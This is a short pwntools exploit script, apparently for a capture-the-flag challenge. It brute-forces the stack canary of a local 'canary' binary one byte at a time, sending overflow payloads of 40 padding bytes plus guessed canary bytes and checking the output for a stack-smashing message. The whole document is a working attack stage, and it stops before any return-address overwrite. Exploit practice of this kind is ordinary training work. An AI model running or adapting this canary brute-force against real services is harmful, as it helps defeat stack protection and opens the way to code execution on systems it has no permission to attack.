#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os = 'linux',arch = 'amd64',log_level = 'debug')

file_name = './canary'
lib_name = ''
# debug = 1
# if debug:
#     p = process(file_name)
#     context.terminal = ['tmux','splitw','-h']
#     # gdb.attach(p)
# else:
#     ip = 'node5.buuoj.cn'
#     port = ''
#     p = remote(ip, port)
elf = ELF(file_name)
rop = ROP(file_name)
# libc = ELF(lib_name)

canary = '\x00'
for k in range(3):
    for i in range(256):
        p = process(file_name)
        p.recvuntil(b'Give me some gift?')
        p.send('aaaa')
        p.recvuntil(b'Show me your magic')
        print(f"爆破第{k+1}位")
        print(f"当前字符为{chr(i)}")
        payload = 'a'* 40 + canary + chr(i)
        print(f"当前payload为{payload}")
        p.send(payload)
        data = p.recvall(timeout=1)
        if b'stack' not in data:
            canary += chr(i)
            print(f'canary is: {canary}')
            p.close()
            break
        p.close()


